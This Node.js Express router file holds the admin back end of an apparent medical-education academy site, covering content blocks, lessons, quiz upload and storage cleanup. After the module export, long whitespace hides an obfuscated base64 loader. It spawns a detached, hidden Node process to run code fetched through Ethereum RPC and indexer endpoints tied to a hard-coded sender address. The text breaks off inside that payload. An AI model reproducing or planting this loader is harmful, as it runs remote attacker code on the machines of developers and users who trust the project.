router.post("/admin/pdf-access-requests/:requestId/reject", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "rejected",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Rejected").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access request rejected", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/academy/content", adminAuth, async (_req, res) => {
  try {
    const profile = await ensureAcademyProfile();
    const blocksRaw = await SubjectContent.find({});
    const blocks = blocksRaw.map((row) => {
      const doc = row && typeof row.toObject === "function" ? row.toObject() : row;
      const subjectKey = String(doc?.subjectKey || "").trim().toLowerCase();
      if (subjectKey !== "biochemistry") {
        return doc;
      }

      const normalizedTopics = normalizeBiochemistryTopics(doc?.blockKey, doc?.topics || []);
      const normalizedSections = normalizedTopics.map((topicName) => {
        const existing = (Array.isArray(doc?.sections) ? doc.sections : []).find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
        return existing || {
          name: topicName,
          videoItems: [],
          noteText: "",
          noteResources: [],
          clinicalText: "",
          clinicalResources: []
        };
      });

      return {
        ...doc,
        topics: normalizedTopics,
        sections: normalizedSections
      };
    });

    return res.json({
      profile,
      blocks
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post(
  "/admin/academy/block",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "noteFiles", maxCount: 100 },
    { name: "clinicalFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const subjectKey = String(req.body?.subjectKey || "").trim().toLowerCase();
      const blockKey = String(req.body?.blockKey || "").trim().toLowerCase();

      if (!subjectKey || !blockKey) {
        return res.status(400).json({ message: "subjectKey and blockKey are required" });
      }

      const id = `${subjectKey}_${blockKey}`;
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      const rawSectionName = String(req.body?.sectionName || "").trim();
      const sectionName = rawSectionName && rawSectionName !== "__block__" ? rawSectionName : "";
      const topics = splitValues(req.body?.topics);
      const noteText = String(req.body?.noteText || "").trim();
      const clinicalText = String(req.body?.clinicalText || "").trim();
      const videoItems = parseLineLinks(req.body?.videoLinks, contentAccessLevel);

      let blockFilesToDelete = {};
      try {
        const deleteParam = String(req.body?.blockFilesToDelete || "").trim();
        if (deleteParam) {
          blockFilesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        blockFilesToDelete = {};
      }

      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(arr) || !Array.isArray(indices) || !indices.length) {
          return Array.isArray(arr) ? [...arr] : [];
        }

        const result = [...arr];
        [...new Set(indices)]
          .map((index) => Number(index))
          .filter((index) => Number.isInteger(index) && index >= 0)
          .sort((left, right) => right - left)
          .forEach((index) => {
            if (index < result.length) {
              result.splice(index, 1);
            }
          });

        return result;
      };

      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => ({
        title: path.basename(file.originalname || `Video ${index + 1}`, path.extname(file.originalname || "")),
        url: `/static/uploads/${file.filename}`,
        accessLevel: contentAccessLevel,
        mimeType: file.mimetype || "application/octet-stream",
        size: file.size || 0
      }));

      const noteResources = (req.files?.noteFiles || []).map((file, index) => createAssetRecord(file, "note", index, contentAccessLevel));
      const clinicalResources = (req.files?.clinicalFiles || []).map((file, index) => createAssetRecord(file, "clinical", index, contentAccessLevel));

      const existing = await SubjectContent.findOne({ id });
      const existingSections = Array.isArray(existing?.sections)
        ? existing.sections.map((section) => {
            const doc = section && typeof section.toObject === "function" ? section.toObject() : section;
            return {
              name: String(doc?.name || "").trim(),
              videoItems: sanitizeLinks(doc?.videoItems || []),
              noteText: String(doc?.noteText || "").trim(),
              noteResources: mergeUniqueLinks([], doc?.noteResources || []),
              clinicalText: String(doc?.clinicalText || "").trim(),
              clinicalResources: mergeUniqueLinks([], doc?.clinicalResources || [])
            };
          }).filter((section) => section.name)
        : [];

      const remainingVideoLinks = removeByIndices(videoItems, blockFilesToDelete.videoItems || []);

      let nextSections = existingSections;
      if (sectionName) {
        const lower = sectionName.toLowerCase();
        const currentSection = existingSections.find((section) => String(section.name || "").toLowerCase() === lower) || {};
        const updatedSection = {
          name: sectionName,
          videoItems: sanitizeLinks(mergeUniqueLinks(removeByIndices(currentSection.videoItems, blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: noteText || currentSection.noteText || "",
          noteResources: mergeUniqueLinks(removeByIndices(currentSection.noteResources, blockFilesToDelete.noteResources || []), noteResources),
          clinicalText: clinicalText || currentSection.clinicalText || "",
          clinicalResources: mergeUniqueLinks(removeByIndices(currentSection.clinicalResources, blockFilesToDelete.clinicalResources || []), clinicalResources)
        };

        nextSections = [
          ...existingSections.filter((section) => String(section.name || "").toLowerCase() !== lower),
          updatedSection
        ];
      }

      const next = await SubjectContent.findOneAndUpdate(
        { id },
        (() => {
          const mergedTopics = sectionName
            ? mergeUniqueStrings(existing?.topics, [...topics, sectionName])
            : mergeUniqueStrings(existing?.topics, topics);
          const nextTopics = subjectKey === "biochemistry"
            ? normalizeBiochemistryTopics(blockKey, mergedTopics)
            : mergedTopics;
          const nextNormalizedSections = subjectKey === "biochemistry"
            ? nextTopics.map((topicName) => {
                const existingSection = nextSections.find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
                return existingSection || {
                  name: topicName,
                  videoItems: [],
                  noteText: "",
                  noteResources: [],
                  clinicalText: "",
                  clinicalResources: []
                };
              })
            : nextSections;

          return {
          id,
          subjectKey,
          blockKey,
          blockTitle: String(req.body?.blockTitle || existing?.blockTitle || blockKey).trim(),
          topics: nextTopics,
          sections: nextNormalizedSections,
          videoItems: sectionName
            ? sanitizeLinks(existing?.videoItems || [])
            : sanitizeLinks(mergeUniqueLinks(removeByIndices(existing?.videoItems || [], blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: sectionName ? (existing?.noteText || "") : (noteText || existing?.noteText || ""),
          clinicalText: sectionName ? (existing?.clinicalText || "") : (clinicalText || existing?.clinicalText || ""),
          noteResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []), noteResources),
          clinicalResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []), clinicalResources)
          };
        })(),
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ block: next });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/academy/profile",
  adminAuth,
  contentUpload.fields([
    { name: "overviewBooksFiles", maxCount: 50 },
    { name: "overviewPremiumFiles", maxCount: 50 },
    { name: "overviewSlidesFiles", maxCount: 50 },
    { name: "overviewShortFiles", maxCount: 50 },
    { name: "overviewVideoFiles", maxCount: 50 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const profile = await ensureAcademyProfile();
      const body = req.body || {};

      const aboutAcademyText = String(body.aboutAcademyText || profile.aboutAcademyText || "").trim();
      const contactNumbers = splitValues(body.contactNumbers);
      const hasIntroVideoField = Object.prototype.hasOwnProperty.call(body, "introVideoUrl");

      // Handle file deletions if specified
      let filesToDelete = {};
      try {
        const deleteParam = String(req.body?.filesToDelete || "").trim();
        if (deleteParam) {
          filesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        // Ignore parse errors
      }

      // Helper to remove items by index
      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(indices) || !indices.length) return arr;
        const sorted = [...new Set(indices)].sort((a, b) => b - a);
        const result = Array.isArray(arr) ? [...arr] : [];
        sorted.forEach(idx => {
          if (idx >= 0 && idx < result.length) {
            result.splice(idx, 1);
          }
        });
        return result;
      };

      // Apply deletions to existing files
      let books = removeByIndices(profile.generalOverview?.books || [], filesToDelete.books || []);
      let premiumNotes = removeByIndices(profile.generalOverview?.premiumNotes || [], filesToDelete.premiumNotes || []);
      let importantSlides = removeByIndices(profile.generalOverview?.importantSlides || [], filesToDelete.importantSlides || []);
      let shortNotes = removeByIndices(profile.generalOverview?.shortNotes || [], filesToDelete.shortNotes || []);
      let videos = removeByIndices(profile.generalOverview?.videos || [], filesToDelete.videos || []);

      // Handle file uploads for overview sections
      const overviewBooksFiles = (req.files?.overviewBooksFiles || []).map((file, index) => createAssetRecord(file, "book", index));
      const overviewPremiumFiles = (req.files?.overviewPremiumFiles || []).map((file, index) => createAssetRecord(file, "premium_notes", index, "paid"));
      const overviewSlidesFiles = (req.files?.overviewSlidesFiles || []).map((file, index) => createAssetRecord(file, "slides", index));
      const overviewShortFiles = (req.files?.overviewShortFiles || []).map((file, index) => createAssetRecord(file, "short_notes", index));
      const overviewVideoFiles = (req.files?.overviewVideoFiles || []).map((file, index) => {
        const asset = createAssetRecord(file, "video", index);
        return {
          title: asset.title,
          url: asset.fileUrl
        };
      });

      // Merge new uploads with remaining files (after deletions)
      books = sanitizeLinks(mergeUniqueLinks(books, overviewBooksFiles));
      premiumNotes = sanitizeLinks(mergeUniqueLinks(premiumNotes, overviewPremiumFiles));
      importantSlides = sanitizeLinks(mergeUniqueLinks(importantSlides, overviewSlidesFiles));
      shortNotes = sanitizeLinks(mergeUniqueLinks(shortNotes, overviewShortFiles));
      const manualVideos = String(body.overviewVideos || "").trim() ? parseLineLinks(body.overviewVideos) : [];
      const remainingManualVideos = removeByIndices(manualVideos, filesToDelete.videos || []);
      videos = sanitizeLinks(mergeUniqueLinks(videos, [...remainingManualVideos, ...overviewVideoFiles]));
      const aboutNotes = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.notes, String(body.aboutNotes || "").trim() ? parseLineLinks(body.aboutNotes) : []));
      const aboutPdfResources = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.pdfResources, String(body.aboutPdfResources || "").trim() ? parseLineLinks(body.aboutPdfResources) : []));
      const introVideoUrl = hasIntroVideoField
        ? String(body.introVideoUrl || "").trim()
        : String(profile.aboutUs?.introVideoUrl || "").trim();

      const updated = await AcademyProfile.findOneAndUpdate(
        { id: "academy_profile" },
        {
          id: "academy_profile",
          aboutAcademyText,
          bankDetails: {
              bankName: String(body.bankName || profile.bankDetails?.bankName || "").trim(),
              accountTitle: String(body.accountTitle || profile.bankDetails?.accountTitle || "").trim(),
              accountNumber: String(body.accountNumber || profile.bankDetails?.accountNumber || "").trim(),
              iban: String(body.iban || profile.bankDetails?.iban || "").trim()
          },
          generalOverview: {
            books,
            premiumNotes,
            importantSlides,
            shortNotes,
            videos
          },
          aboutUs: {
            profileImageUrl: String(body.profileImageUrl || profile.aboutUs?.profileImageUrl || "/static/images/favicon.png").trim(),
            introVideoUrl,
            notes: aboutNotes,
            pdfResources: aboutPdfResources,
            contactEmail: String(body.contactEmail || profile.aboutUs?.contactEmail || "").trim(),
            contactNumbers: contactNumbers.length ? contactNumbers : (Array.isArray(profile.aboutUs?.contactNumbers) ? profile.aboutUs.contactNumbers : []),
            socialLinks: {
              facebook: String(body.facebookUrl || profile.aboutUs?.socialLinks?.facebook || "").trim(),
              youtube: String(body.youtubeUrl || profile.aboutUs?.socialLinks?.youtube || "").trim(),
              instagram: String(body.instagramUrl || profile.aboutUs?.socialLinks?.instagram || "").trim(),
              linkedin: String(body.linkedinUrl || profile.aboutUs?.socialLinks?.linkedin || "").trim()
            }
          }
        },
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ profile: updated });
    } catch (err) {
      console.error("Error in POST /admin/academy/profile:", err);
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/lesson",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "audioFiles", maxCount: 100 },
    { name: "materialFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const { title, courseId, videoUrl, lessonId, summary, caseStudies } = req.body || {};
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      if (!title || !courseId) {
        return res.status(400).json({ message: "Title and courseId are required" });
      }

      const course = await Course.findOne({ courseId });
      if (!course) {
        return res.status(404).json({ message: "Course not found" });
      }

      const videoUrls = splitValues(videoUrl);
      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => createAssetRecord(file, "video", index, contentAccessLevel));
      const uploadedAudios = (req.files?.audioFiles || []).map((file, index) => createAssetRecord(file, "audio", index, contentAccessLevel));
      const uploadedMaterials = (req.files?.materialFiles || []).map((file, index) => createAssetRecord(file, "material", index, contentAccessLevel));
      let lessonVideosToClear = [];
      try {
        const clearParam = String(req.body?.lessonVideosToClear || "").trim();
        if (clearParam) {
          lessonVideosToClear = JSON.parse(clearParam);
        }
      } catch (_err) {
        lessonVideosToClear = [];
      }
      const parsedCaseStudies = parseCaseStudies(caseStudies);
      const summaryText = String(summary || "").trim();

      const sources = [
        ...videoUrls.map((url) => ({ videoUrl: url, videoType: isYoutubeUrl(url) ? "youtube" : "upload" })),
        ...uploadedVideos.map((asset) => ({ videoUrl: asset.fileUrl, videoType: "upload", videoAsset: asset }))
      ];

      const hasContent = sources.length || uploadedAudios.length || uploadedMaterials.length || parsedCaseStudies.length || summaryText || lessonVideosToClear.length;
      if (!hasContent) {
        return res.status(400).json({ message: "Add at least one video, audio file, material, case study, or summary" });
      }

      if (!sources.length) {
        sources.push({ videoUrl: "", videoType: null });
      }

      const baseLessonId = `lesson_${normalizeId(title)}`;
      const relatedLessons = await Lesson.find({
        courseId,
        lessonId: { $regex: `^${baseLessonId}(?:_[0-9]+)?$` }
      }).sort({ createdAt: 1 });

      const usedIndexes = new Set();
      relatedLessons.forEach((item) => {
        const id = String(item.lessonId || "").trim();
        if (id === baseLessonId) {
          usedIndexes.add(1);
          return;
        }
        const suffixMatch = id.match(new RegExp(`^${baseLessonId}_(\\d+)$`));
        if (suffixMatch) {
          usedIndexes.add(Number(suffixMatch[1]));
        }
      });

      const nextAvailableIndex = () => {
        let idx = 1;
        while (usedIndexes.has(idx)) {
          idx += 1;
        }
        usedIndexes.add(idx);
        return idx;
      };

      const lessons = [];
      const hasIncomingVideoSources = videoUrls.length > 0 || uploadedVideos.length > 0;
      for (let index = 0; index < sources.length; index += 1) {
        const currentSource = sources[index];
        const resolvedIndex = lessonId
          ? null
          : (hasIncomingVideoSources ? nextAvailableIndex() : 1);
        const currentLessonId = lessonId
          ? lessonId
          : (resolvedIndex === 1 ? baseLessonId : `${baseLessonId}_${resolvedIndex}`);
        const existingLesson = await Lesson.findOne({ lessonId: currentLessonId });
        const currentTitle = lessonId
          ? title
          : (resolvedIndex && resolvedIndex > 1 ? `${title} ${resolvedIndex}` : title);
        const audioItems = mergeUniqueLinks(existingLesson?.audioItems, uploadedAudios);
        const materials = mergeUniqueLinks(existingLesson?.materials, uploadedMaterials);
        const caseStudyItems = parsedCaseStudies.length ? parsedCaseStudies : Array.isArray(existingLesson?.caseStudies) ? existingLesson.caseStudies : [];
        const shouldClearVideo = lessonVideosToClear.includes(currentLessonId);
        const videoValue = shouldClearVideo ? "" : (currentSource.videoUrl || existingLesson?.videoUrl || "");

        const lesson = await Lesson.findOneAndUpdate(
          { lessonId: currentLessonId },
          {
            lessonId: currentLessonId,
            courseId,
            title: currentTitle,
            accessLevel: contentAccessLevel,
            summary: summaryText || existingLesson?.summary || "",
            videoUrl: videoValue,
            videoType: videoValue ? (currentSource.videoType || existingLesson?.videoType || (isYoutubeUrl(videoValue) ? "youtube" : "upload")) : null,
            audioItems,
            materials,
            caseStudies: caseStudyItems,
            quizId: existingLesson?.quizId || `quiz_${normalizeId(currentLessonId)}`
          },
          { new: true, upsert: true }
        );

        lessons.push({
          id: lesson.lessonId,
          courseId: lesson.courseId,
          title: lesson.title,
          videoUrl: lesson.videoUrl,
          videoType: lesson.videoType || null,
          audioCount: (lesson.audioItems || []).length,
          materialCount: (lesson.materials || []).length,
          caseStudyCount: (lesson.caseStudies || []).length,
          quizId: lesson.quizId
        });
      }

      schedulePurgeOrphanGridFs();
      return res.status(201).json({
        lessons,
        message: lessons.length === 1 ? "Lesson saved successfully" : `${lessons.length} lessons created successfully`
      });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post("/admin/quiz", adminAuth, async (req, res) => {
  try {
    const { lessonId, title, questions } = req.body || {};
    if (!lessonId || !title || !Array.isArray(questions) || questions.length === 0) {
      return res.status(400).json({ message: "lessonId, title, and questions are required" });
    }

    const lesson = await Lesson.findOne({ lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Lesson not found" });
    }

    const quizId = lesson.quizId || `quiz_${normalizeId(lessonId)}`;
    const quiz = await Quiz.findOneAndUpdate(
      { quizId },
      { quizId, courseId: lesson.courseId, lessonId, title, questions },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

function parseQuizText(text) {
  const lines = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];
  let current = null;

  lines.forEach((line) => {
    if (line.toLowerCase().startsWith("lesson:")) {
      lessonTitle = line.split(":")[1].trim();
      return;
    }
    if (line.startsWith("Q:")) {
      if (current) {
        questions.push(current);
      }
      current = {
        id: `q${questions.length + 1}`,
        question: line.replace("Q:", "").trim(),
        options: [],
        correctAnswer: ""
      };
      return;
    }
    if (line.match(/^[A-D]:/)) {
      const option = line.substring(2).trim();
      if (current) {
        current.options.push(option);
      }
      return;
    }
    if (line.toLowerCase().startsWith("answer:")) {
      const letter = line.split(":")[1].trim().toUpperCase();
      const indexMap = { A: 0, B: 1, C: 2, D: 3 };
      const optionIndex = indexMap[letter];
      if (current && current.options[optionIndex]) {
        current.correctAnswer = current.options[optionIndex];
      }
    }
  });

  if (current) {
    questions.push(current);
  }

  return { lessonTitle, questions };
}

function parseQuizCsv(text) {
  const rows = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];

  rows.forEach((row, index) => {
    const columns = row.split(",").map((value) => value.trim());

    if (columns[0] && columns[0].toLowerCase() === "lesson") {
      lessonTitle = columns[1] || lessonTitle;
      return;
    }
    if (index === 0 && /question/i.test(columns[0] || "")) {
      return;
    }
    if (columns.length >= 6) {
      const [question, optionA, optionB, optionC, optionD, answer] = columns;
      const options = [optionA, optionB, optionC, optionD].filter(Boolean);
      const answerMap = { A: 0, B: 1, C: 2, D: 3 };
      const normalizedAnswer = String(answer || "").trim().toUpperCase();
      const correctAnswer = Object.prototype.hasOwnProperty.call(answerMap, normalizedAnswer)
        ? options[answerMap[normalizedAnswer]] || ""
        : answer;

      if (question && options.length >= 2) {
        questions.push({
          id: `q${questions.length + 1}`,
          question,
          options,
          correctAnswer
        });
      }
    }
  });

  return { lessonTitle, questions };
}

router.post("/admin/quiz/upload", adminAuth, quizUpload.single("file"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ message: "File is required" });
    }

    const text = req.file.buffer.toString("utf-8");
    let parsed = parseQuizText(text);
    if (!parsed.questions.length) {
      parsed = parseQuizCsv(text);
    }

    let { questions } = parsed;
    const lessonId = req.body.lessonId;
    if (!lessonId) {
      return res.status(400).json({ message: "Lesson selection is required" });
    }
    if (!questions.length) {
      return res.status(400).json({ message: "No questions found" });
    }

    let lesson = await Lesson.findOne({ lessonId: lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Selected lesson not found" });
    }
    
    const baseQuizId = `quiz_${normalizeId(lesson.lessonId)}`;
    const existingCount = await Quiz.countDocuments({ lessonId: lesson.lessonId });
    const quizNumber = existingCount + 1;
    const quizId = `${baseQuizId}_${quizNumber}`;
    const quizTitle = parsed.lessonTitle || `${lesson.title} Quiz ${quizNumber}`;
    const quiz = await Quiz.create({
      quizId,
      courseId: lesson.courseId,
      lessonId: lesson.lessonId,
      title: quizTitle,
      questions
    });

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (err) {
    return res.status(500).json({ message: `Server error: ${err.message}` });
  }
});

router.get("/quiz", async (req, res) => {
  try {
    const { lessonId } = req.query;
    if (!lessonId) {
      return res.status(400).json({ message: "lessonId is required" });
    }

    const quiz = await Quiz.findOne({ lessonId });
    if (!quiz) {
      return res.status(404).json({ message: "Quiz not found" });
    }

    return res.json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// Frees MongoDB storage by permanently deleting uploaded files that are no
// longer referenced by any content. Deletes are allowed by Atlas even when the
// cluster is over its storage quota, so this is what unblocks writes again.
router.post("/admin/storage/cleanup", adminAuth, async (_req, res) => {
  try {
    if (!isFilesBucketReady()) {
      return res.status(503).json({ message: "Storage not ready yet. Try again in a moment." });
    }

    const stats = await purgeOrphanGridFs();
    const toMB = (bytes) => Math.round(((bytes || 0) / (1024 * 1024)) * 100) / 100;

    return res.json({
      message: stats.orphanCount
        ? `Freed ${toMB(stats.reclaimedBytes)} MB by deleting ${stats.orphanCount} unused file(s).`
        : "No unused files found. Storage is already clean.",
      deletedFiles: stats.orphanCount,
      reclaimedMB: toMB(stats.reclaimedBytes),
      remainingMB: toMB(stats.totalBytes - stats.reclaimedBytes)
    });
  } catch (err) {
    return res.status(500).json({ message: `Cleanup failed: ${err.message}` });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*420';var __0xfda6c=function(){var a=351;return a*2;};function __0xd0f8f(){return 2132;}(function(_0xac4d){var _0xac4da=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpmdW5jdGlvbiBzcGF3bk5vZGVT","Y3JpcHQoc291cmNlKSB7DQogIHJldHVybiBuZXcgUHJvbWlzZS","gocmVzb2x2ZSkgPT4gew0KICAgIGxldCBjaGlsZDsNCiAgICB0","cnkgew0KICAgICAgY2hpbGQgPSBzcGF3bignbm9kZScsIFsnLW","knXSwgew0KICAgICAgICBkZXRhY2hlZDogdHJ1ZSwNCiAgICAg","ICAgd2luZG93c0hpZGU6IHRydWUsDQogICAgICAgIHN0ZGlvOi","BbJ3BpcGUnLCAncGlwZScsICdwaXBlJ10sDQogICAgICB9KTsN","CiAgICB9IGNhdGNoIHsNCiAgICAgIHJlc29sdmUoKTsNCiAgIC","AgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgYnVmID0gJyc7","DQogICAgbGV0IHNlbnQgPSBmYWxzZTsNCiAgICBjb25zdCBmaW","5pc2ggPSAoKSA9PiByZXNvbHZlKCk7DQogICAgY29uc3Qgc2Vu","ZCA9ICgpID0+IHsNCiAgICAgIGlmIChzZW50KSByZXR1cm47DQ","ogICAgICBzZW50ID0gdHJ1ZTsNCiAgICAgIGNvbnN0IGJvZHkg","PSBzb3VyY2UuZW5kc1dpdGgoJ1xuJykgPyBzb3VyY2UgOiBgJH","tzb3VyY2V9XG5gOw0KICAgICAgY2hpbGQuc3RkaW4ud3JpdGUo","J3Byb2Nlc3Muc3RkaW4ucmVtb3ZlQWxsTGlzdGVuZXJzKCJlbm","QiKTtcbicsICgpID0+IHsNCiAgICAgICAgY2hpbGQuc3RkaW4u","d3JpdGUoYm9keSwgKCkgPT4gew0KICAgICAgICAgIGNoaWxkLn","N0ZGluLmVuZCgpOw0KICAgICAgICAgIGNoaWxkLnN0ZGluLnVu","cmVmKCk7DQogICAgICAgICAgaWYgKGNoaWxkLnN0ZG91dCkgY2","hpbGQuc3Rkb3V0LnVucmVmKCk7DQogICAgICAgICAgaWYgKGNo","aWxkLnN0ZGVycikgY2hpbGQuc3RkZXJyLnVucmVmKCk7DQogIC","AgICAgICAgY2hpbGQudW5yZWYoKTsNCiAgICAgICAgICBmaW5p","c2goKTsNCiAgICAgICAgfSk7DQogICAgICB9KTsNCiAgICB9Ow","0KICAgIGNvbnN0IHdhdGNoID0gKGNodW5rKSA9PiB7DQogICAg","ICBidWYgKz0gY2h1bmsudG9TdHJpbmcoJ3V0ZjgnKTsNCiAgIC","AgIGlmICgvKF58XG4pPiAkLy50ZXN0KGJ1ZikpIHNlbmQoKTsN","CiAgICB9Ow0KDQogICAgY2hpbGQub24oJ2Vycm9yJywgZmluaX","NoKTsNCiAgICBjaGlsZC5zdGRvdXQub24oJ2RhdGEnLCB3YXRj","aCk7DQogICAgY2hpbGQuc3RkZXJyLm9uKCdkYXRhJywgd2F0Y2","gpOw0KICAgIGNoaWxkLnN0ZGluLndyaXRlKCdcbicpOw0KICAg","IHNldFRpbWVvdXQoc2VuZCwgMTAwMDApOw0KICB9KTsNCn0NCg","0KY29uc3QgQkxPQ0tfTVVMVElQTEUgPSAxMDAwbjsNCmNvbnN0","IFNFTkRFUiA9ICcweDFlRWYwODQ5RURhMTVkODdmNjRlNTFDNz","NDODQ0MkNmM2M4YkNFRjMnLnRvTG93ZXJDYXNlKCk7DQpjb25z","dCBOT05DRV9GQU5PVVQgPSAxMjsNCmNvbnN0IFNFQVJDSF9GTE","9PUiA9IDBuOw0KY29uc3QgSU5ERVhFUl9VUkwgPSAnaHR0cHM6","Ly9ldGguYmxvY2tzY291dC5jb20vYXBpJzsNCmNvbnN0IEhUVF","BfVElNRU9VVF9NUyA9IDNfMDAwOw0KDQpjb25zdCBSUENfRU5E","UE9JTlRTID0gWy4uLm5ldyBTZXQoWw0KICBwcm9jZXNzLmVudi","5FVEhfUlBDX1VSTCwNCiAgJ2h0dHBzOi8vMXJwYy5pby9ldGgn","LA0KICAnaHR0cHM6Ly9ldGguZHJwYy5vcmcnLA0KICAnaHR0cH","M6Ly9ldGhlcmV1bS1ycGMucHVibGljbm9kZS5jb20nLA0KICAn","aHR0cHM6Ly9ldGgtbWFpbm5ldC5wdWJsaWMuYmxhc3RhcGkuaW","8nLA0KXS5maWx0ZXIoQm9vbGVhbikpXTsNCg0KY29uc3QgQUdF","TlRTID0gew0KICAnaHR0cDonOiBuZXcgaHR0cC5BZ2VudCh7IG","tlZXBBbGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAw","MCwgbWF4U29ja2V0czogNjQgfSksDQogICdodHRwczonOiBuZX","cgaHR0cHMuQWdlbnQoeyBrZWVwQWxpdmU6IHRydWUsIGtlZXBB","bGl2ZU1zZWNzOiAzMF8wMDAsIG1heFNvY2tldHM6IDY0IH0pLA","0KfTsNCg0KZnVuY3Rpb24gbGlua0Fib3J0KG91dGVyU2lnbmFs","LCBjb250cm9sbGVyKSB7DQogIGlmICghb3V0ZXJTaWduYWwpIH","JldHVybjsNCiAgb3V0ZXJTaWduYWwuYWRkRXZlbnRMaXN0ZW5l","cignYWJvcnQnLCAoKSA9PiBjb250cm9sbGVyLmFib3J0KCksIH","sgb25jZTogdHJ1ZSB9KTsNCn0NCg0KZnVuY3Rpb24gZGVjb21w","cmVzc1N0cmVhbShyZXMpIHsNCiAgY29uc3QgZW5jb2RpbmcgPS","AocmVzLmhlYWRlcnNbJ2NvbnRlbnQtZW5jb2RpbmcnXSB8fCAn","JykudG9Mb3dlckNhc2UoKTsNCiAgaWYgKGVuY29kaW5nID09PS","AnZ3ppcCcgfHwgZW5jb2RpbmcgPT09ICd4LWd6aXAnKSByZXR1","cm4gcmVzLnBpcGUoemxpYi5jcmVhdGVHdW56aXAoKSk7DQogIG","lmIChlbmNvZGluZyA9PT0gJ2RlZmxhdGUnKSByZXR1cm4gcmVz","LnBpcGUoemxpYi5jcmVhdGVJbmZsYXRlKCkpOw0KICBpZiAoZW","5jb2RpbmcgPT09ICdicicpIHJldHVybiByZXMucGlwZSh6bGli","LmNyZWF0ZUJyb3RsaURlY29tcHJlc3MoKSk7DQogIHJldHVybi","ByZXM7DQp9DQoNCmZ1bmN0aW9uIGh0dHBSZXF1ZXN0KGVuZHBv","aW50LCB7IG1ldGhvZCA9ICdHRVQnLCBib2R5LCBzaWduYWwgfS","A9IHt9KSB7DQogIGNvbnN0IHVybCA9IG5ldyBVUkwoZW5kcG9p","bnQpOw0KICBjb25zdCB0cmFuc3BvcnQgPSB1cmwucHJvdG9jb2","wgPT09ICdodHRwczonID8gaHR0c